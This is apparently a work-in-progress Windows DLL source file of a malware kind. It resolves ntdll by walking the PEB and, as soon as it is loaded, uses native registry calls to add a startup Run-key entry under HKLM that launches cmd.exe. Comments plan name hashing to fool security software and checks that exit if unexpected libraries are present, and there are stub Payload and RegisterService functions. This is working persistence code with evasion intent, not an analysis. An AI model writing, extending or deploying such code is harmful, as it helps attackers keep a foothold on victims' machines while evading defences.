#include "library.h"
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#ifdef _WIN32
#define EXPORT __declspec(dllexport)
#else
#define EXPORT
#endif


HMODULE GetLibraryBase(const wchar_t * dllName) {
    //PEB is located at offset 60
    ULONG_PTR peb = __readgsqword(0x60);

    // ldr offset 0x18 from PEB
    ULONG_PTR ldr = *(ULONG_PTR *) (peb + 0x18);

    //get head of linked list of libraries
    LIST_ENTRY *list_head = (LIST_ENTRY *) (ldr + 0x20);
    LIST_ENTRY *current_node = list_head->Flink;

    //This part is probably unnecessary, as the ntdll is almost always on the second jump, and kernel32.dll on the third
    //with further imports after that
    while (current_node != list_head) {
        LDR_DATA_TABLE_ENTRY *libraryEntry = CONTAINING_RECORD(current_node, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (libraryEntry->FullDllName.Buffer != NULL) {
            //TODO add hashing to possibly fool software we are loading kernel32.dll
            //TODO add index checking that if we find libraries that are not supposed to be here, exit immediately
            if (wcsstr(libraryEntry->FullDllName.Buffer, dllName) != NULL ||
                wcsstr(libraryEntry->FullDllName.Buffer, dllName) != NULL) {
                return (HMODULE) libraryEntry->DllBase;
            }
        }
        current_node = current_node->Flink;
    }
    return nullptr;
}

void* GetProcAddressByHash(HMODULE hModule, const char* targetHash) {
    //Get the DOS headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);

    //Export dir
    IMAGE_DATA_DIRECTORY exportDirEntry = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDirEntry.VirtualAddress);

    //Knowing the export dir, we know the offsets of the three function export tables
    DWORD* nameArray = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
    WORD* ordinalArray = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
    DWORD* functionArray = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);

    //find the function name through the name export
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        //we have to cast to BYTE * here to force moving forward by one byte at a time
        //RVA -> VA conversion could break otherwise
        const auto functionName = (char *)((BYTE*)hModule + nameArray[i]);
        if (strcmp(functionName, targetHash) == 0) {
            const WORD functionOrdinal = ordinalArray[i];
            const DWORD functionRVA = functionArray[functionOrdinal];
            return (void*)((BYTE*)hModule + functionRVA);
        }
    }
    return NULL;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            OnProcessAttach();
            break;
        case DLL_PROCESS_DETACH:
            break;
        default:
            return FALSE;
    }
    return TRUE;
}


typedef NTSTATUS (NTAPI *pNtOpenKey)(
    PHANDLE            KeyHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes
);

typedef NTSTATUS (NTAPI *pNtSetValueKey)(
    HANDLE           KeyHandle,
    PUNICODE_STRING  ValueName,
    ULONG            TitleIndex,
    ULONG            Type,
    PVOID            Data,
    ULONG            DataSize
);

typedef NTSTATUS (NTAPI *pNtClose)(
    HANDLE          KeyHandle
);


void OnProcessAttach() {
    HMODULE ntdll = GetLibraryBase(L"ntdll.dll");
    pNtSetValueKey setKey = (pNtSetValueKey)GetProcAddress(ntdll, "NtSetValueKey");
    pNtOpenKey openKey = (pNtOpenKey)GetProcAddress(ntdll, "NtOpenKey");
    pNtClose closeKey = (pNtClose)GetProcAddress(ntdll, "NtClose");


    UNICODE_STRING registryPath, name;
    InitUnicodeString(&registryPath, L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
    auto program = L"C:\\Windows\\System32\\cmd.exe";
    InitUnicodeString(&name, L"TestingRegistry");

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &registryPath, 0x00000040 | 0x00000002, NULL, NULL);

    HANDLE hKey = NULL;
    NTSTATUS openResult = openKey(&hKey, KEY_WRITE | KEY_SET_VALUE, &objAttr);

    if (openResult == 0) {
        auto result = setKey(hKey, &name, 0, REG_SZ, (void *) program, (ULONG)((wcslen(program) + 1) * sizeof(WCHAR)));
        if (result != 0) {

            char errorMsg[64];
            sprintf(errorMsg, "Write unsuccessful. NTSTATUS: 0x%08X", result);
            MessageBoxA(nullptr, errorMsg, "ERROR", MB_OK | MB_ICONERROR);
        }
    } else {
        MessageBoxA(nullptr,"Key has not been opened",
                           "ERROR",
                           MB_OK | MB_ICONERROR);
    }


    closeKey(hKey);
}
void Payload() {

}



void InitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString) {
    if (SourceString) {
        USHORT length = (USHORT)(wcslen(SourceString) * sizeof(WCHAR));
        DestinationString->Length = length;
        DestinationString->MaximumLength = length + sizeof(WCHAR);
        DestinationString->Buffer = (PWSTR)SourceString;
    } else {
        DestinationString->Length = 0;
        DestinationString->MaximumLength = 0;
        DestinationString->Buffer = NULL;
    }
}

int RegisterService(HMODULE ntdll) {


    return 0;
}




